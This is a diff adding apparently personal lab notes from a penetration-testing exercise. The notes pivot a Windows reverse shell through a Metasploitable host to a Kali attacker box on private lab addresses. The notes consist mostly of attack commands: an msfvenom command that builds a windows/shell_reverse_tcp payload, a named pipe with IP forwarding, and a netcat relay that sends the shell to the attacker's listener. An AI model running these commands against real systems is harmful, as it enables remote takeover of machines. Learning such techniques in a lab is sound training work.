@@ -1,1 +1,51 @@
+first IP(Kali):
+192.168.69.2
+
+metasploitable:
+192.168.69.5
+10.10.10.5
+
+windows:
+10.10.10.2
+
+(kali):
+msfvenom -p windows/shell_reverse_tcp --platform windows LHOST=10.10.10.5 LPORT=6666 -f exe -o payload.exe
+
+(we need to root the metasploitable box!!!!!!)
+- we are going now to create the pipes, just like in the firewall videos:
+
+sudo mknod p0wnedpipe1 p
+
+sudo cat /proc/sys/net/ipv4/ip_forward
+change to 1
+(we need this setup or the payload ran from the Windows box will not be forwarded)
+
+(metasploitable)
+nc -nlvp 6666 < p0wnedpipe1 | nc -nv 192.168.69.2 6969 > p0wnedpipe1
+
+(kali)
+nc -nlvp 6969
+(once we run this we can see we got the connection)
+
+(windows)
+run the payload.exe and should be routed through the metasploitable server to the attacker's Kali box.
+whoami
+
+(metasploitable)
+cat p0wnedpipe1
+whoami
+
+(there's some error here, where the command whoami was not send to the kali box!!!!)
+(SOLUTION - CREATE THE PIPE WITH THE ROOT USER)
+
+NOW THINGS WORK ON THE KALI SIDE!!!!!
+
+
+
+
+
+
+
+
+
 
